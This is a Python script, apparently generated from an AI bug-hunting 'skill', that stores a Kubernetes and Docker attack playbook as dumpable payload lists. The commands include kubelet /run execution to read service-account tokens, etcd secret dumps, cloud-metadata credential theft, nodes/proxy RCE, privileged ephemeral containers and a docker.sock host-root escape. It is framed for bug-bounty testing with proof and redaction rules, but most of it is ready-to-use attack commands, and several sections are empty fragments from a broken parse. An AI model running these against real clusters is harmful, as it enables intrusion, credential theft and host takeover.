#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-k8s

Skill: HUNT-K8S — Kubernetes & Docker Security
Desc : Hunt Kubernetes & Docker — API anonymous access, kubelet 10250 exec (SPDY/WebSocket, NOT plain POST) and the simpler /run primitive, etcd 2379 unauth, dashboard skip-login, RBAC misconfig, secret/SA-token abuse, docker.sock host escape, runc/container-escape (Leaky Vessels CVE-2024-21626), API-server-mediated nodes/proxy RCE, EphemeralContainers node-shell, bound/projected SA-token audience+expiry abuse, admission-controller bypass, Helm/Tiller remnants. Use when target runs containerized infra, exposes K8s ports (6443/10250/10255/2379/8443), or cloud metadata reveals K8s service accounts.

Run:  python claude-bughunter-hunt-k8s.py --help
      python claude-bughunter-hunt-k8s.py --list
      python claude-bughunter-hunt-k8s.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-k8s'
TITLE = 'HUNT-K8S — Kubernetes & Docker Security'
DESCRIPTION = 'Hunt Kubernetes & Docker — API anonymous access, kubelet 10250 exec (SPDY/WebSocket, NOT plain POST) and the simpler /run primitive, etcd 2379 unauth, dashboard skip-login, RBAC misconfig, secret/SA-token abuse, docker.sock host escape, runc/container-escape (Leaky Vessels CVE-2024-21626), API-server-mediated nodes/proxy RCE, EphemeralContainers node-shell, bound/projected SA-token audience+expiry abuse, admission-controller bypass, Helm/Tiller remnants. Use when target runs containerized infra, exposes K8s ports (6443/10250/10255/2379/8443), or cloud metadata reveals K8s service accounts.'

PAYLOADS = {
    'main': ["name: hunt-k8s", "description: \"Hunt Kubernetes & Docker \u2014 API anonymous access, kubelet 10250 exec (SPDY/WebSocket, NOT plain POST) and the simpler /run primitive, etcd 2379 unauth, dashboard skip-login, RBAC misconfig, secret/SA-token abuse, docker.sock host escape, runc/container-escape (Leaky Vessels CVE-2024-21626), API-server-mediated nodes/proxy RCE, EphemeralContainers node-shell, bound/projected SA-token audience+expiry abuse, admission-controller bypass, Helm/Tiller remnants. Use when target runs containerized infra, exposes K8s ports (6443/10250/10255/2379/8443), or cloud metadata reveals K8s service accounts.\"", "sources: hackerone_public, cve_database, kubernetes_security_research, portswigger_research", "report_count: 13"],
    'hunt-k8s-kubernetes-docker-security': [],
    'crown-jewel-targets': ["K8s API anonymous cluster-admin = full cluster control. docker.sock + RCE = host root. A single privileged-pod create or a kubelet `/run` shell pivots one finding to total compromise.", "**Highest-value findings:**", "- **K8s API anonymous cluster-admin** \u2014 `system:anonymous`/`system:unauthenticated` bound to a powerful role (classic misconfig: `system:anonymous` in a `ClusterRoleBinding` to `cluster-admin`) \u2192 full `kubectl`. Mere anonymous `200` is NOT this (see false-positive section).", "- **Kubelet `10250` exec/run** \u2014 `/run` returns command output directly; `/exec` is a SPDY/WebSocket stream (see Phase 3). Either \u2192 RCE in any pod \u2192 steal that pod's SA token.", "- **API-server-mediated kubelet RCE** \u2014 `/api/v1/nodes/<node>/proxy/run/...` reaches the kubelet *through* the API server using your (low-priv) token; if RBAC grants `nodes/proxy`, you get pod RCE without touching 10250 directly. Primary 2024-2026 vector.", "- **etcd `2379` unauth** \u2014 every Secret (SA tokens, TLS keys, app creds) stored, often plaintext (unless `EncryptionConfiguration` is set) \u2192 full credential dump.", "- **docker.sock exposure** \u2014 SSRF/LFI/RCE reaching `/var/run/docker.sock` \u2192 create `--privileged` container, bind-mount host `/` \u2192 host root.", "- **Container escape via runc** \u2014 Leaky Vessels (CVE-2024-21626): `WORKDIR`/`process.cwd` pointing at a leaked `/proc/self/fd/<n>` host FD \u2192 break out of an attacker-controlled image/exec to host root.", "- **SA token abuse** \u2014 auto-mounted token at `/var/run/secrets/kubernetes.io/serviceaccount/token`; check its real grants with SelfSubjectRulesReview before claiming impact.", "- **K8s Dashboard skip-login / token-less API** \u2014 full cluster management UI reachable unauthenticated."],
    'oob-confirmation-gate-read-first': ["K8s findings are RCE/credential-disclosure class. House rule: **prove state change or data read, never infer from a status code.**", "- A `200` on `/api/v1/namespaces` does **not** mean cluster-admin. The API server returns `200` with an RBAC-filtered (often empty `items: []`) list to *any* principal that can reach `list namespaces` \u2014 anonymous read on a few resources is common and low-impact. Confirm real privilege with **SelfSubjectRulesReview / SelfSubjectAccessReview**, then by actually reading a Secret value.", "- **10255 (read-only) vs 10250 (exec)** are constantly conflated. 10255 (HTTP, no auth) is info-disclosure only \u2014 it has `/pods`, `/stats`, `/metrics`, NO exec/run. 10250 (HTTPS) is where `/run` and `/exec` live. Do not report \"kubelet RCE\" off a 10255 hit.", "- **Blind/outbound vectors need OOB.** If you exploit SSRF\u2192IMDS\u2192K8s, or a pod's egress, confirm the outbound hop with a Burp Collaborator / interactsh subdomain (e.g. `curl http://<token>.<collab>` from inside the pod via `/run`). A delayed response or an echoed URL is NOT proof.", "- **Impact proof = the artifact.** For exec: the literal `id`/`hostname` output. For etcd/Secret: the decoded token bytes (redact in report). For docker.sock escape: the host file content (`/etc/hostname` of the node, distinct from the container's).", "- Use a **dedicated test namespace / test pod** when you have create rights; never exec into production workloads to \"prove\" RCE \u2014 list the pod and exec a read-only `id` in a pod you spun up if policy allows, or limit to a single non-destructive `id` and stop."],
    'phase-1-fingerprint-port-discovery': ["```bash"],
    'common-kubernetes-container-ports': ["PORTS=\"443,6443,8443,8080,10250,10255,10256,2379,2380,4194,9090,9100,30000-30010\"", "nmap -sV -p $PORTS $TARGET 2>/dev/null | grep open"],
    'api-server-fingerprint-the-version-endpoint-is-anonymous-on-most-clusters': ["curl -sk \"https://$TARGET:6443/version\"        # {\"major\":\"1\",\"minor\":\"29\",\"gitVersion\":\"v1.29.x\"...}", "curl -sk \"https://$TARGET:6443/api\"             # APIVersions list, even pre-auth", "curl -sk \"https://$TARGET:6443/healthz\""],
    'cloud-metadata-pivot-reach-k8s-sa-node-creds-from-an-ssrf-foothold': ["curl -s \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" # AWS EKS (IMDSv1)", "TOK=$(curl -s -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\") # IMDSv2", "curl -s -H \"X-aws-ec2-metadata-token: $TOK\" \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"", "curl -s \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" -H \"Metadata: true\"      # Azure AKS", "curl -s \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\" -H \"Metadata-Flavor: Google\" # GKE", "Note the `gitVersion` \u2014 it gates every CVE below."],
    'phase-2-kubernetes-api-anonymous-low-priv-access': ["```bash", "SRV=\"https://$TARGET:6443\""],
    '1-what-am-i-anonymous-system-anonymous': ["curl -sk \"$SRV/apis/authentication.k8s.io/v1/selfsubjectreviews\" -X POST \\", "-H 'Content-Type: application/json' \\", "-d '{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"SelfSubjectReview\"}'"],
    '2-what-can-i-actually-do-the-only-honest-privilege-check': ["curl -sk \"$SRV/apis/authorization.k8s.io/v1/selfsubjectrulesreviews\" -X POST \\", "-H 'Content-Type: application/json' \\", "-d '{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"default\"}}'"],
    '3-targeted-access-check-for-the-crown-jewel-verbs': ["for R in secrets pods nodes/proxy pods/exec; do", "curl -sk \"$SRV/apis/authorization.k8s.io/v1/selfsubjectaccessreviews\" -X POST \\", "-H 'Content-Type: application/json' \\", "-d \"{\\\"kind\\\":\\\"SelfSubjectAccessReview\\\",\\\"apiVersion\\\":\\\"authorization.k8s.io/v1\\\",\\\"spec\\\":{\\\"resourceAttributes\\\":{\\\"verb\\\":\\\"create\\\",\\\"resource\\\":\\\"${R%%/*}\\\",\\\"subresource\\\":\\\"${R#*/}\\\"}}}\" \\"],
    '4-only-if-access-review-says-allowed-read-a-real-secret-to-prove-impact': ["curl -sk \"$SRV/api/v1/secrets\" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get(\"items\",[])),\"secrets\")'"],
    'decode-one-value-redact-before-reporting': [],
    'echo-base64-base64-d': ["**CVE-2018-1002105** (`gitVersion` < v1.10.11/1.11.5/1.12.3): API-server proxy upgrade flaw lets an unauthenticated/low-priv user escalate to backend (kubelet/aggregated-API) requests with API-server identity \u2192 cluster-admin. Fingerprint `gitVersion` in Phase 1; if vulnerable this is the single highest-impact finding."],
    'phase-3-kubelet-port-10250-run-first-exec-done-right': ["The earlier version of this skill sent `/exec` as a plain `POST` and expected `id` output back. **That is wrong.** `/exec` is a SPDY/WebSocket *streaming* endpoint: a plain POST returns a **302 redirect to a stream location** (e.g. `/cri/exec/<token>`) that you then must read with a SPDY/WebSocket client. An operator who runs the old curl sees nothing and wrongly concludes the kubelet is patched.", "```bash", "SRV=\"https://$TARGET:10250\""],
    'enumerate-pods-auth-varies-many-kubelets-allow-anonymous-read-here': ["curl -sk \"$SRV/pods\" | python3 -m json.tool 2>/dev/null \\", "NS=default; POD=target-pod; CTR=app"],
    'primitive-a-run-returns-command-output-directly-no-stream-handling': [],
    'this-is-the-simple-correct-primitive-use-this-first': ["curl -sk -X POST \"$SRV/run/$NS/$POD/$CTR\" -d \"cmd=id\"", "curl -sk -X POST \"$SRV/run/$NS/$POD/$CTR\" -d \"cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token\""],
    'primitive-b-exec-spdy-websocket-stream-not-a-plain-post': [],
    'option-1-kubeletctl-handles-the-stream-transport-for-you-recommended': [],
    'kubeletctl-server-target-exec-id-p-pod-c-ctr-n-ns': [],
    'kubeletctl-server-target-scan-rce-finds-every-exec-able-pod': [],
    'option-2-raw-the-post-returns-a-302-to-a-stream-path-v-to-see-location-then': [],
    'read-it-with-a-spdy3-1-websocket-client-wscat-websocat-e-g': [],
    'curl-sk-i-x-post-srv-exec-ns-pod-ctr-command-id-input-1-output-1-tty-0-shows-302-location': [],
    'websocat-k-wss-target-10250-cri-exec-token-from-location': [],
    'container-logs-read-only-no-stream': ["curl -sk \"$SRV/containerLogs/$NS/$POD/$CTR\""],
    'read-only-kubelet-10255-info-disclosure-only-no-exec-run-do-not-call-this-rce': ["curl -s \"http://$TARGET:10255/pods\" | python3 -m json.tool 2>/dev/null | head", "curl -s \"http://$TARGET:10255/metrics\" | head", "**CVE-2020-8558** (host-network trust): on affected kube-proxy, services bound to the node's `127.0.0.1` (incl. the read-only kubelet and other localhost-only services) become reachable from other pods/adjacent hosts via the node IP, defeating the localhost trust boundary \u2014 a lateral path to kubelet/etcd that were assumed loopback-only."],
    'phase-4-api-server-mediated-kubelet-rce-nodes-proxy': ["When 10250 is firewalled but you hold a token (even a low-priv pod SA) with `nodes/proxy`, route exec **through the API server**:", "```bash", "SRV=\"https://$TARGET:6443\"; H=\"-H \\\"Authorization: Bearer $TOKEN\\\"\"", "NODE=$(curl -sk -H \"Authorization: Bearer $TOKEN\" \"$SRV/api/v1/nodes\" | grep -o '\"name\":\"[^\"]*\"' | head -1 | cut -d'\"' -f4)"],
    'run-via-the-node-proxy-output-comes-straight-back': ["curl -sk -X POST -H \"Authorization: Bearer $TOKEN\" \\", "\"$SRV/api/v1/nodes/$NODE/proxy/run/$NS/$POD/$CTR\" -d \"cmd=id\""],
    'enumerate-every-pod-on-a-node-via-the-proxy': ["curl -sk -H \"Authorization: Bearer $TOKEN\" \"$SRV/api/v1/nodes/$NODE/proxy/pods\"", "`nodes/proxy` in any bound role is effectively node-wide RCE. **CVE-2022-3294** (kube-apiserver node-address validation): an authenticated user could redirect the API server's proxy connection to an arbitrary host/IP it could reach (proxy-to-internal SSRF / node impersonation) \u2014 relevant whenever you can influence node addresses or use the proxy subresource."],
    'phase-5-etcd-unauth-port-2379': ["```bash"],
    'etcd-holds-all-cluster-state-secrets-are-plaintext-unless-encryptionconfiguration-is-set': ["ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 get / --prefix --keys-only 2>/dev/null | head -50", "ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 \\", "get /registry/secrets --prefix 2>/dev/null | strings | grep -Ei 'token|password|tls.key|dockerconfig' | head -40"],
    'http-json-gateway-key-range-are-base64-lw': ["curl -s \"http://$TARGET:2379/v3/kv/range\" -H 'Content-Type: application/json' \\", "-d '{\"key\":\"L3JlZ2lzdHJ5L3NlY3JldHM=\",\"range_end\":\"L3JlZ2lzdHJ5L3NlY3JldHQ=\",\"limit\":20}' | python3 -m json.tool"],
    'v2-older-clusters': ["curl -s \"http://$TARGET:2379/v2/keys/?recursive=true\" | python3 -m json.tool 2>/dev/null | head", "A recovered SA token from etcd \u2192 replay against the API server (Phase 6) to confirm grants. **False positive:** a `200` from etcd peer port `2380` or a TLS-required port returning a handshake error is not unauth client access \u2014 only a successful `range`/`get` with key data is."],
    'phase-6-service-account-token-abuse-bound-projected-tokens': ["```bash"],
    'from-rce-lfi-inside-a-pod': ["TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)", "NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)", "API=\"https://kubernetes.default.svc\""],
    'modern-tokens-are-bound-projected-they-have-an-audience-short-expiry-decode-before-claiming-reuse': ["echo \"$TOKEN\" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool"],
    'look-at-aud-must-match-the-api-server-audience-to-be-accepted': [],
    'exp-projected-tokens-rotate-1h-a-captured-token-may-already-be-dead': [],
    'kubernetes-io-serviceaccount-pod-node-binding-token-dies-with-the-pod': [],
    'if-aud-is-e-g-vault-not-the-api-server-audience-it-will-not-authenticate-to-the-api-not-cluster-impact': [],
    'honest-privilege-check-then-prove-with-a-real-read': ["curl -sk \"$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews\" -X POST \\", "-H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' \\", "-d \"{\\\"kind\\\":\\\"SelfSubjectRulesReview\\\",\\\"apiVersion\\\":\\\"authorization.k8s.io/v1\\\",\\\"spec\\\":{\\\"namespace\\\":\\\"$NS\\\"}}\"", "curl -sk \"$API/api/v1/namespaces/$NS/secrets\" -H \"Authorization: Bearer $TOKEN\"", "**EphemeralContainers node-shell escalation:** with `pods/ephemeralcontainers` (or pod `create`), attach a debug container that shares the host namespaces to escape the pod:", "```bash", "kubectl debug node/$NODE -it --image=busybox      # mounts host root at /host \u2192 chroot /host"],
    'or-patch-an-ephemeral-container-with-hostpid-privileged-via-the-api': ["curl -sk -X PATCH \"$API/api/v1/namespaces/$NS/pods/$POD/ephemeralcontainers\" \\", "-H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/strategic-merge-patch+json' \\", "-d '{\"spec\":{\"ephemeralContainers\":[{\"name\":\"x\",\"image\":\"busybox\",\"command\":[\"sleep\",\"1d\"],\"securityContext\":{\"privileged\":true}}]}}'"],
    'phase-7-docker-socket-exposure-runc-container-escape': ["```bash"],
    'docker-sock-reachable-ssrf-unix-lfi-of-socket-or-rce-on-host': ["curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/info", "curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json"],
    'privileged-container-bind-mounting-host-root-read-write-host-fs-host-escape': ["curl -s --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \\", "-X POST http://localhost/v1.41/containers/create?name=poc \\", "-d '{\"Image\":\"alpine\",\"Cmd\":[\"cat\",\"/host/etc/hostname\"],\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true}}'", "curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/poc/start", "curl -s --unix-socket /var/run/docker.sock \"http://localhost/v1.41/containers/poc/logs?stdout=1\""],
    'impact-proof-the-node-s-etc-hostname-differs-from-the-container-s-hostname': ["**Container-escape CVEs (gate on runc/version):**", "- **CVE-2024-21626 \u2014 \"Leaky Vessels\" (runc \u2264 1.1.11):** a leaked host file descriptor via `/proc/self/fd/<n>` lets a malicious image (`WORKDIR /proc/self/fd/N`) or `runc exec` cwd escape to the host filesystem \u2192 host RCE. Test only with an image you control on a build/registry surface where you can influence the Dockerfile.", "- **CVE-2019-5736 (runc):** overwrite the host `/proc/self/exe` (the runc binary) from inside a container you can exec into \u2192 host root on next runc invocation. Applies to very old runc.", "- **CVE-2022-0492 (cgroups v1 `release_agent`):** a container with `CAP_SYS_ADMIN` (or able to mount cgroupfs) writes a `release_agent` that executes on the host \u2192 escape. Check container caps first."],
    'phase-8-dashboard-admission-helm-tiller-remnants': ["```bash"],
    'kubernetes-dashboard-correct-api-base-is-api-v1-under-the-dashboard-service': ["curl -sk \"https://$TARGET:8443/\" | grep -i \"kubernetes dashboard\""],
    'token-less-probe-skip-login-or-anonymous-bound-dashboard-sa': ["curl -sk \"https://$TARGET:8443/api/v1/secret/default\"            # secrets list view", "curl -sk \"https://$TARGET:8443/api/v1/pod/default\"               # pods list view", "curl -sk \"https://$TARGET:8443/api/v1/namespace\"                 # namespaces"],
    'paths-are-resource-not-resource-id-a-200-with-real-items-unauth-dashboard-data-access': [],
    'helm-2-tiller-remnant-grpc-on-44134-historically-no-auth-full-cluster-as-tiller-s-sa': ["nmap -p 44134 -sV $TARGET"],
    'helm-host-target-44134-ls-if-it-answers-tiller-is-exposed-install-delete-any-release': [],
    'validating-mutating-admission-webhooks-enumerate-to-find-bypassable-policy-or-ssrf-able-webhook-urls': ["curl -sk \"$SRV/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations\" -H \"Authorization: Bearer $TOKEN\""],
    'a-webhook-clientconfig-url-pointing-at-an-external-attacker-influenced-host-ssrf-bypass-surface': [],
    'chain-table': [],
    'false-positive-killers': ["- **Anon `200` \u2260 cluster-admin.** RBAC-filtered list returns `200`/empty `items`. Require SelfSubjectRulesReview to show the verbs, then an actual Secret value read.", "- **10255 \u2260 10250.** Read-only kubelet has no exec/run. \"Kubelet RCE\" must come from a `/run` output or a completed `/exec` stream on 10250.", "- **`/exec` plain-POST returns 302, not output.** Seeing no body is NOT \"patched\" \u2014 follow the stream (kubeletctl/websocat) before concluding either way.", "- **Projected/bound SA token may be dead or wrong-audience.** Decode `exp` and `aud`; a Vault/OIDC-audience token will not authenticate to the API server.", "- **etcd plaintext assumption.** If `EncryptionConfiguration` is enabled, Secret values in etcd are ciphertext \u2014 don't claim \"plaintext secrets\" without showing decoded bytes.", "- **Version-gated CVEs.** Confirm `gitVersion` (Phase 1) / runc version before asserting CVE-2018-1002105, -2024-21626, -2019-5736, etc. A version match is a lead; the PoC output is the proof.", "- **Dashboard `200` on the HTML shell** is just the login page; only a `200` with real resource JSON under `/api/v1/<resource>/<ns>` proves token-less data access."],
    'validation-checklist': ["- [ ] **API anon:** SelfSubjectRulesReview shows privileged verbs AND a real Secret value was read (redacted).", "- [ ] **Kubelet:** literal `id`/`hostname` output returned from 10250 `/run`, or a completed `/exec` stream \u2014 not a bare 302.", "- [ ] **nodes/proxy RCE:** command output returned through `/api/v1/nodes/<node>/proxy/run/...` with your token.", "- [ ] **etcd:** decoded Secret bytes shown (proves unencrypted + readable), not just a key listing.", "- [ ] **docker.sock / escape:** the NODE's host file content retrieved (distinct from container), or runc-escape PoC output.", "- [ ] **SA token:** `aud`/`exp` decoded and shown valid; impact bounded to its real RBAC.", "- [ ] **OOB:** any outbound/SSRF hop confirmed via Collaborator/interactsh subdomain.", "**Severity:**", "- API anon\u2192secret read, kubelet/nodes-proxy RCE, etcd dump, docker.sock/runc escape, CVE-2018-1002105: **Critical**", "- Dashboard token-less data access, exposed Tiller: **High**", "- Read-only kubelet 10255, anon `/version`/`/pods` info disclosure: **Medium**"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()